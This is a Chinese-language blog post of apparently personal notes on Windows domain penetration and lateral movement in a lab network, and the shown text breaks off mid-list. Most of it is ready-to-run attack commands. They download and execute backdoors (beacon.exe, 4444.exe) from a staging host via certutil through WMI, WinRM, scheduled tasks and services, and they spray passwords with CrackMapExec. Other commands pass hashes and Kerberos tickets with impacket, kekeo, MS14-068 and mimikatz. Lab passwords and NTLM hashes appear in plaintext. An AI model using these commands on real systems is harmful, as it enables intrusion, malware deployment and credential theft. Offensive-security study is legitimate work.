<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>内网安全 | Jw1ng's Blog</title><meta name="author" content="Jw1ng"><meta name="copyright" content="Jw1ng"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="基本概念名词局域网工作组域环境活动目录AD域控制器DC域认知基本架构 单域  父子域  域树  域森林   隧道技术SOCKS代理内网穿透frp nps 代理隧道DNS ICMP HTTP SSH UDP 信息收集基本信息版本 补丁 网口 systeminfo 详细信息   net start 启动服务t   asjlist 进程列表   schtasks 计划任务 对内凭据收集对外打点AD域环境">
<meta property="og:type" content="article">
<meta property="og:title" content="内网安全">
<meta property="og:url" content="http://example.com/2024/09/10/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/index.html">
<meta property="og:site_name" content="Jw1ng&#39;s Blog">
<meta property="og:description" content="基本概念名词局域网工作组域环境活动目录AD域控制器DC域认知基本架构 单域  父子域  域树  域森林   隧道技术SOCKS代理内网穿透frp nps 代理隧道DNS ICMP HTTP SSH UDP 信息收集基本信息版本 补丁 网口 systeminfo 详细信息   net start 启动服务t   asjlist 进程列表   schtasks 计划任务 对内凭据收集对外打点AD域环境">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
<meta property="article:published_time" content="2024-09-10T14:48:15.981Z">
<meta property="article:modified_time" content="2024-09-10T15:18:22.540Z">
<meta property="article:author" content="Jw1ng">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/09/10/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: undefined,
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '内网安全',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-09-10 23:18:22'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Jw1ng's Blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Jw1ng's Blog"><span class="site-name">Jw1ng's Blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">内网安全</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-09-10T14:48:15.981Z" title="Created 2024-09-10 22:48:15">2024-09-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-09-10T15:18:22.540Z" title="Updated 2024-09-10 23:18:22">2024-09-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="内网安全"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="名词"><a href="#名词" class="headerlink" title="名词"></a>名词</h3><h4 id="局域网"><a href="#局域网" class="headerlink" title="局域网"></a>局域网</h4><h4 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h4><h4 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h4><h4 id="活动目录AD"><a href="#活动目录AD" class="headerlink" title="活动目录AD"></a>活动目录AD</h4><h4 id="域控制器DC"><a href="#域控制器DC" class="headerlink" title="域控制器DC"></a>域控制器DC</h4><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><h3 id="认知"><a href="#认知" class="headerlink" title="认知"></a>认知</h3><h2 id="基本架构"><a href="#基本架构" class="headerlink" title="基本架构"></a>基本架构</h2><ul>
<li><p>单域</p>
</li>
<li><p>父子域</p>
</li>
<li><p>域树</p>
</li>
<li><p>域森林</p>
</li>
</ul>
<h2 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h2><h3 id="SOCKS代理"><a href="#SOCKS代理" class="headerlink" title="SOCKS代理"></a>SOCKS代理</h3><h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><p>frp</p>
<p>nps</p>
<h4 id="代理隧道"><a href="#代理隧道" class="headerlink" title="代理隧道"></a>代理隧道</h4><p>DNS</p>
<p>ICMP</p>
<p>HTTP</p>
<p>SSH</p>
<p>UDP</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><p>版本</p>
<p>补丁</p>
<p>网口</p>
<p>systeminfo 详细信息</p>
<p>  net start 启动服务t</p>
<p>  asjlist 进程列表</p>
<p>  schtasks 计划任务</p>
<h3 id="对内凭据收集"><a href="#对内凭据收集" class="headerlink" title="对内凭据收集"></a>对内凭据收集</h3><h3 id="对外打点"><a href="#对外打点" class="headerlink" title="对外打点"></a>对外打点</h3><h3 id="AD域环境"><a href="#AD域环境" class="headerlink" title="AD域环境"></a>AD域环境</h3><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h3 id="入口差异"><a href="#入口差异" class="headerlink" title="入口差异"></a>入口差异</h3><h4 id="域外"><a href="#域外" class="headerlink" title="域外"></a>域外</h4><ul>
<li>提权</li>
<li>切换到域内用户<ul>
<li>获取域内用户凭据</li>
<li>域内用户枚举（kerbrute）</li>
</ul>
</li>
</ul>
<h4 id="域内"><a href="#域内" class="headerlink" title="域内"></a>域内</h4><ul>
<li>提权获取凭据</li>
</ul>
<h3 id="基于口令凭证"><a href="#基于口令凭证" class="headerlink" title="基于口令凭证"></a>基于口令凭证</h3><ul>
<li>利用条件<ul>
<li>被控机处于域内</li>
<li>获得其它主机的信息（密码凭证、IP、主机名）</li>
</ul>
</li>
</ul>
<h4 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h4><ul>
<li><p>利用命令</p>
<ul>
<li><p>net use \server\ipc$ “password” &#x2F;user:计算机名\username # 工作组</p>
</li>
<li><p>net use \server\ipc$ “password” &#x2F;user:域名\username #域内</p>
</li>
<li><p>dir \xx.xx.xx.xx\C$\        # 查看文件列表</p>
</li>
<li><p>copy \xx.xx.xx.xx\C$\1.bat 1.bat # 下载文件</p>
</li>
<li><p>copy 1.bat \xx.xx.xx.xx\C$ # 复制文件</p>
</li>
<li><p>net use \xx.xx.xx.xx\C$\1.bat &#x2F;del # 删除IPC</p>
</li>
<li><p>net view xx.xx.xx.xx        # 查看对方共享</p>
</li>
</ul>
</li>
<li><p>建立IPC链接</p>
</li>
<li><p>拷贝shell</p>
<ul>
<li>上传木马到目标主机</li>
</ul>
</li>
<li><p>横向移动</p>
<ul>
<li><p>复制木马到域内其它主机</p>
</li>
<li><p>创建计划任务执行脚本</p>
<p>[at] &amp; [schtasks]计划任务配合</p>
<p>1、at &lt; Windows2012</p>
<p>copy beacon.exe \192.168.3.32\c$ #拷贝执行文件到目标机器</p>
<p>at \192.168.3.21 15:47 c:\beacon.exe  #添加计划任务</p>
<p>2、schtasks &gt;&#x3D;Windows2012</p>
<p>shell copy beacon.exe \192.168.3.32\c$ #拷贝执行文件到目标机器</p>
<p>shell schtasks &#x2F;create &#x2F;s 192.168.3.32 &#x2F;ru “SYSTEM” &#x2F;tn beacon &#x2F;sc DAILY &#x2F;tr c:\beacon.exe &#x2F;F #创beacon任务对应执行文件</p>
<p>shell schtasks &#x2F;run &#x2F;s 192.168.3.32 &#x2F;tn beacon &#x2F;i #运行beacon任务</p>
<p>connect 192.168.3.32 5454 #连接正向木马（如果上传的是正向shell）</p>
<p>shell schtasks &#x2F;delete &#x2F;s 192.168.3.32 &#x2F;tn beacon &#x2F;f#删除beacon任务</p>
</li>
</ul>
</li>
<li><p>删除IPC链接</p>
</li>
<li><p>拓展工具</p>
<ul>
<li>impacket<ul>
<li>代理执行</li>
</ul>
</li>
</ul>
</li>
<li><p>具体利用</p>
<p>域内用户权限测试：webadmin权限</p>
<p>net use \\192.168.3.32\ipc$ “admin!@#45” &#x2F;user:sqlserver\administrator</p>
<p>net use \\192.168.3.32\ipc$ “admin!@#45” &#x2F;user:god\dbadmin</p>
<p>net use \\192.168.3.32\ipc$ “admin!@#45” &#x2F;user:administrator</p>
<p>理解为登录域里的administrator而不是登录目标的administrator用户</p>
<p>域外用户权限测试：administrator权限</p>
<p>shell net use \192.168.3.32\ipc$ “admin!@#45” &#x2F;user:administrator </p>
<p>&#x2F;&#x2F;登录本机administrator用户</p>
<p>net use \192.168.3.32\ipc$ “admin!@#45” &#x2F;user:sqlserver\administrator  </p>
<p>&#x2F;&#x2F;登录sqlserver机器的administrator用户</p>
<p>net use \192.168.3.32\ipc$ “admin!@#45” &#x2F;user:god\dbadmin</p>
<p>&#x2F;&#x2F;登录god域的administrator用户</p>
</li>
<li><p>#建立IPC常见的错误代码</p>
</li>
</ul>
<p>（1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限</p>
<p>（2）51：网络问题，Windows 无法找到网络路径</p>
<p>（3）53：找不到网络路径，可能是IP地址错误、目标未开机、目标Lanmanserver服务未启动、有防火墙等问题</p>
<p>（4）67：找不到网络名，本地Lanmanworkstation服务未启动，目标删除ipc$</p>
<p>（5）1219：提供的凭据和已存在的凭据集冲突，说明已建立IPC$，需要先删除</p>
<p>（6）1326：账号密码错误</p>
<p>（7）1792：目标NetLogon服务未启动，连接域控常常会出现此情况</p>
<p>（8）2242：用户密码过期，目标有账号策略，强制定期更改密码</p>
<h4 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h4><ul>
<li><p>实验步骤</p>
<ul>
<li>反向木马连接webserver</li>
<li>上传正向木马到webserver</li>
<li>构造下载目录让sqlserver下载正向木马（通过webserver开启的80服务）</li>
</ul>
</li>
<li><p>利用条件</p>
<ul>
<li>WMI服务开启（135端口）</li>
<li>防火墙允许通信</li>
<li>知道目标机的账号密码或HASH</li>
</ul>
</li>
<li><p>利用详情</p>
<ul>
<li><p>wmic</p>
<ul>
<li><p>文件下载</p>
<p><img src="/.com//Users\85885\Documents\Hexo-Blog\source_posts\内网安全\Snipaste_2024-06-16_21-46-14.png" alt="Snipaste_2024-06-16_21-46-14"></p>
<p>shell wmic &#x2F;node:192.168.3.32 &#x2F;user:sqlserver\administrator &#x2F;password:admin!@#45 process call create “certutil -urlcache -split -f <a target="_blank" rel="noopener" href="http://192.168.3.31/5454.exe">http://192.168.3.31/5454.exe</a> c:&#x2F;5454.exe”</p>
</li>
<li><p>文件执行</p>
<p>shell wmic &#x2F;node:192.168.3.32 &#x2F;user:sqlserver\administrator &#x2F;password:admin!@#45 process call create “c:&#x2F;5454.exe”</p>
</li>
</ul>
</li>
<li><p>wmiexec-impacket（建立socks代理隧道）</p>
<ul>
<li><p>python wmiexec.py sqlserver&#x2F;administrator:admin!@#<a href="mailto:&#52;&#53;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#51;&#46;&#51;&#50;">&#52;&#53;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#51;&#46;&#51;&#50;</a></p>
<p>python wmiexec.py sqlserver&#x2F;administrator:admin!@#<a href="mailto:&#x34;&#53;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x33;&#46;&#51;&#x32;">&#x34;&#53;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x33;&#46;&#51;&#x32;</a> “whoami”</p>
<p>python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c sqlserver&#x2F;<a href="mailto:&#97;&#100;&#x6d;&#x69;&#x6e;&#x69;&#115;&#x74;&#114;&#x61;&#x74;&#x6f;&#114;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#x38;&#46;&#x33;&#46;&#x33;&#x32;">&#97;&#100;&#x6d;&#x69;&#x6e;&#x69;&#115;&#x74;&#114;&#x61;&#x74;&#x6f;&#114;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#x38;&#46;&#x33;&#46;&#x33;&#x32;</a> “whoami”</p>
<p>下载后门：</p>
<p>python wmiexec.py sqlserver&#x2F;administrator:admin!@#<a href="mailto:&#52;&#x35;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#x33;&#x2e;&#x33;&#x32;">&#52;&#x35;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#x33;&#x2e;&#x33;&#x32;</a> “certutil -urlcache -split -f <a target="_blank" rel="noopener" href="http://192.168.3.31/beacon.exe">http://192.168.3.31/beacon.exe</a> c:&#x2F;beacon.exe”</p>
<p>执行后门：</p>
<p>python wmiexec.py sqlserver&#x2F;administrator:admin!@#<a href="mailto:&#x34;&#53;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#x33;&#x2e;&#x33;&#x32;">&#x34;&#53;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#x33;&#x2e;&#x33;&#x32;</a> “c:&#x2F;beacon.exe”</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h4><ul>
<li><p>利用条件</p>
<ul>
<li><p>文件与打印机服务开启</p>
</li>
<li><p>防火墙允许通信（135、445）</p>
</li>
<li><p>知道目标机的账号密码或HASH</p>
</li>
</ul>
</li>
<li><p>利用详情</p>
<ul>
<li><p>smbexec-impacket</p>
<ul>
<li><p>python smbexec.py sqlserver&#x2F;administrator:admin!@#<a href="mailto:&#52;&#53;&#x40;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#46;&#51;&#x2e;&#x33;&#x32;">&#52;&#53;&#x40;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#46;&#51;&#x2e;&#x33;&#x32;</a></p>
<p>python smbexec.py -hashes :518b98ad4178a53695dc997aa02d455c sqlserver&#x2F;<a href="mailto:&#x61;&#x64;&#x6d;&#105;&#x6e;&#x69;&#115;&#116;&#114;&#97;&#x74;&#x6f;&#x72;&#x40;&#x31;&#57;&#50;&#46;&#49;&#x36;&#56;&#46;&#51;&#46;&#51;&#x32;">&#x61;&#x64;&#x6d;&#105;&#x6e;&#x69;&#115;&#116;&#114;&#97;&#x74;&#x6f;&#x72;&#x40;&#x31;&#57;&#50;&#46;&#49;&#x36;&#56;&#46;&#51;&#46;&#51;&#x32;</a></p>
</li>
</ul>
</li>
<li><p>cs插件-psexec</p>
</li>
</ul>
<p><img src="/.com//Users\85885\Documents\Hexo-Blog\source_posts\内网安全\Snipaste_2024-06-16_22-57-24.png" alt="Snipaste_2024-06-16_22-57-24"></p>
</li>
</ul>
<h4 id="DCOM"><a href="#DCOM" class="headerlink" title="DCOM"></a>DCOM</h4><ul>
<li><p>利用条件</p>
<ul>
<li>适用win7及以上系统</li>
<li>管理员权限powershell</li>
<li>远程主机防火墙未阻止</li>
</ul>
</li>
<li><p>具体命令</p>
<ul>
<li><p>python dcomexec.py sqlserver&#x2F;administrator:admin!@#<a href="mailto:&#52;&#x35;&#x40;&#x31;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#x2e;&#51;&#46;&#x33;&#x32;">&#52;&#x35;&#x40;&#x31;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#x2e;&#51;&#46;&#x33;&#x32;</a></p>
<p>python dcomexec.py sqlserver&#x2F;administrator:admin!@#<a href="mailto:&#52;&#x35;&#x40;&#49;&#x39;&#x32;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#x33;&#46;&#51;&#x32;">&#52;&#x35;&#x40;&#49;&#x39;&#x32;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#x33;&#46;&#51;&#x32;</a> whoami</p>
<p>python dcomexec.py sqlserver&#x2F;administrator:@192.168.3.32 whoami -hashes :518b98ad4178a53695dc997aa02d455c</p>
</li>
</ul>
</li>
</ul>
<h4 id="winrs-winrm"><a href="#winrs-winrm" class="headerlink" title="winrs&amp;winrm"></a>winrs&amp;winrm</h4><ul>
<li><p>利用条件</p>
<ul>
<li><p>win2012之前需手动开启</p>
<ul>
<li><p>开启命令</p>
<p>winrm quickconfig -q</p>
<p>winrm set winrm&#x2F;config&#x2F;Client @{TrustedHosts&#x3D;”*”}</p>
</li>
</ul>
</li>
<li><p>5986、5985端口开启</p>
</li>
</ul>
</li>
<li><p>具体命令</p>
<ul>
<li><p>连接执行：通过winrs来执行远程命令</p>
<p>winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 whoami</p>
<p>winrs -r:192.168.3.21 -u:192.168.3.21\administrator -p:Admin12345 whoami</p>
</li>
<li><p>上线C2:</p>
<p>winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 “cmd.exe &#x2F;c certutil -urlcache -split -f <a target="_blank" rel="noopener" href="http://192.168.3.31/4444.exe">http://192.168.3.31/4444.exe</a> 4444.exe &amp; 4444.exe”</p>
</li>
<li><p>cs命令（以上命令用不了）</p>
<p>shell winrm invoke Create wmicimv2&#x2F;win32_process @{CommandLine&#x3D;”cmd.exe &#x2F;c certutil -urlcache -split -f <a target="_blank" rel="noopener" href="http://192.168.3.31/3389.exe">http://192.168.3.31/3389.exe</a> 3389.exe &amp; 3389.exe”} -r:sqlserver -u:sqlserver\administrator -p:admin!@#45</p>
</li>
</ul>
</li>
</ul>
<h4 id="rdp"><a href="#rdp" class="headerlink" title="rdp"></a>rdp</h4><ul>
<li><p>利用条件</p>
<ul>
<li>开启rdp、远程桌面服务</li>
</ul>
</li>
<li><p>在本机远程连接</p>
<ul>
<li><p>socks代理</p>
</li>
<li><p>端口转发（http隧道，直接上传文件到被控机就行了，其它的像iox等内网穿透工具就需要工具落地目标机）</p>
<p><img src="/.com//Users\85885\Documents\Hexo-Blog\source_posts\内网安全\Snipaste_2024-06-17_20-39-17.png" alt="Snipaste_2024-06-17_20-39-17"></p>
</li>
</ul>
</li>
</ul>
<h4 id="综合测试工具"><a href="#综合测试工具" class="headerlink" title="综合测试工具"></a>综合测试工具</h4><ul>
<li><p>CrackMapExec-密码喷射</p>
<ul>
<li><p>proxychains4 crackmapexec smb 192.168.3.21-32 -u user.txt -H 518b98ad4178a53695dc997aa02d455c #域用户HASH登录</p>
<p>proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -p ‘admin!@#45’ –local-auth #本地用户明文登录</p>
<p>proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -p ‘admin!@#45’ –local-auth -x “whoami” #本地用户明文登录并执行命令</p>
<p>proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -H 518b98ad4178a53695dc997aa02d455c –local-auth #本地用户HASH登录</p>
<p>proxychains4 crackmapexec smb 192.168.3.21-32 -u user.txt -H 518b98ad4178a53695dc997aa02d455c –local-auth -x “cmd.exe &#x2F;c certutil -urlcache -split -f <a target="_blank" rel="noopener" href="http://192.168.3.31/4444.exe">http://192.168.3.31/4444.exe</a> 4444.exe &amp; 4444.exe”</p>
<p>proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -p pass.txt –local-auth -x “cmd.exe &#x2F;c certutil -urlcache -split -f <a target="_blank" rel="noopener" href="http://192.168.3.31/4444.exe">http://192.168.3.31/4444.exe</a> 4444.exe &amp; 4444.exe”</p>
<p>proxychains4 crackmapexec smb 192.168.3.21-32 -u user.txt -H 518b98ad4178a53695dc997aa02d455c –local-auth –users</p>
</li>
</ul>
</li>
<li><p>Minikatz</p>
</li>
</ul>
<p>当系统为win10或者2012R2以上，内存中默认禁止缓存明文密码</p>
<p>可通过修改注册表的方式进行抓取，但需重启后重新登录时才能抓取。</p>
<p>windows 2012以上默认关闭了Wdigest，所以攻击者无法通过内存获取到明文密码</p>
<p>为了针对以上情况 所以有四种方法解决：</p>
<p>1.利用（PTH,PTK）等进行移动不需要明文</p>
<p>2.利用其他服务协议（SMB&#x2F;WMI等进行哈希移动）</p>
<p>3.利用注册表开启（wdigest auth）进行获取、</p>
<p>4.利用工具或者第三方平台（HASHCAT进行破解获取）</p>
<h4 id="pth（哈希传递攻击）"><a href="#pth（哈希传递攻击）" class="headerlink" title="pth（哈希传递攻击）"></a>pth（哈希传递攻击）</h4><ul>
<li>HASH差异</li>
</ul>
<p>​	<img src="/.com//Users\85885\Documents\Hexo-Blog\source_posts\内网安全\Snipaste_2024-06-18_19-18-03.png" alt="Snipaste_2024-06-18_19-18-03"></p>
<ul>
<li>利用思路<ul>
<li>利用套件工具直接利用Hash传递<ul>
<li>mimikatz</li>
<li>impacket-at&amp;ps&amp;wmi&amp;smb</li>
</ul>
</li>
<li>hash暴力破解明文<ul>
<li>hashcat</li>
</ul>
</li>
<li>修改注册表重启进行获取明文</li>
</ul>
</li>
</ul>
<h4 id="ptt（票据传递攻击）"><a href="#ptt（票据传递攻击）" class="headerlink" title="ptt（票据传递攻击）"></a>ptt（票据传递攻击）</h4><ul>
<li><p>利用思路</p>
<ul>
<li><p>MS14068漏洞</p>
<ul>
<li><p>获取SID值：shell whoami&#x2F;user</p>
</li>
<li><p>生成票价文件：</p>
<ul>
<li>shell ms14-068.exe -u 域名 -s SID值 -d IP -p 密码</li>
<li>shell ms14-068.exe -u <a href="mailto:&#x77;&#101;&#98;&#x61;&#x64;&#x6d;&#105;&#x6e;&#64;&#103;&#x6f;&#x64;&#46;&#x6f;&#x72;&#x67;">&#x77;&#101;&#98;&#x61;&#x64;&#x6d;&#105;&#x6e;&#64;&#103;&#x6f;&#x64;&#46;&#x6f;&#x72;&#x67;</a> -s S-1-5-21-1218902331-2157346161-1782232778-1132 -d 192.168.3.21 -p admin!@#45</li>
</ul>
</li>
<li><p>清除票价连接</p>
<ul>
<li>shell klist purge</li>
</ul>
</li>
<li><p>内存导入票据</p>
<ul>
<li>mimikatz kerberos::ptc <a href="mailto:&#84;&#x47;&#84;&#95;&#119;&#x65;&#x62;&#x61;&#100;&#109;&#x69;&#110;&#64;&#103;&#111;&#x64;&#x2e;&#x6f;&#x72;&#x67;&#46;&#x63;&#99;&#x61;&#x63;&#x68;&#x65;">&#84;&#x47;&#84;&#95;&#119;&#x65;&#x62;&#x61;&#100;&#109;&#x69;&#110;&#64;&#103;&#111;&#x64;&#x2e;&#x6f;&#x72;&#x67;&#46;&#x63;&#99;&#x61;&#x63;&#x68;&#x65;</a></li>
</ul>
</li>
<li><p>连接目标上线</p>
<ul>
<li><p>shell dir \OWA2010CN-GOD\c$</p>
<p>shell net use \OWA2010CN-GOD\C$</p>
<p>copy beacon.exe \OWA2010CN-GOD\C$</p>
<p>sc \OWA2010CN-GOD create bindshell binpath&#x3D; “c:\beacon.exe”</p>
<p>sc \OWA2010CN-GOD start bindshell</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>kekeo-利用NTLM生成新的票据认证，前提是有与域控主机连接遗留的票据</p>
<ul>
<li>生成票据<ul>
<li>shell kekeo “tgt::ask &#x2F;user:Administrator &#x2F;domain:god.org &#x2F;ntlm:ccef208c6485269c20db2cad21734fe7” “exit”</li>
</ul>
</li>
<li>导入票据<ul>
<li>shell kekeo “kerberos::ptt <a href="mailto:&#84;&#71;&#x54;&#x5f;&#65;&#100;&#109;&#105;&#x6e;&#x69;&#115;&#x74;&#114;&#x61;&#116;&#111;&#x72;&#64;&#71;&#x4f;&#x44;&#46;&#x4f;&#82;&#71;&#95;&#x6b;&#x72;&#x62;&#116;&#x67;&#116;">&#84;&#71;&#x54;&#x5f;&#65;&#100;&#109;&#105;&#x6e;&#x69;&#115;&#x74;&#114;&#x61;&#116;&#111;&#x72;&#64;&#71;&#x4f;&#x44;&#46;&#x4f;&#82;&#71;&#95;&#x6b;&#x72;&#x62;&#116;&#x67;&#116;</a>~<a href="mailto:&#103;&#111;&#x64;&#x2e;&#111;&#x72;&#x67;&#64;&#x47;&#x4f;&#x44;&#46;&#79;&#82;&#x47;&#46;&#x6b;&#x69;&#x72;&#98;&#105;">&#103;&#111;&#x64;&#x2e;&#111;&#x72;&#x67;&#64;&#x47;&#x4f;&#x44;&#46;&#79;&#82;&#x47;&#46;&#x6b;&#x69;&#x72;&#98;&#105;</a>“ “exit”</li>
</ul>
</li>
<li>查看票据<ul>
<li>shell klist</li>
</ul>
</li>
<li>利用票据连接<ul>
<li>shell dir \owa2010cn-god\c$</li>
</ul>
</li>
</ul>
</li>
<li><p>mimikatz</p>
<ul>
<li>导出票据<ul>
<li>mimikatz sekurlsa::tickets &#x2F;export</li>
</ul>
</li>
<li>导入票据<ul>
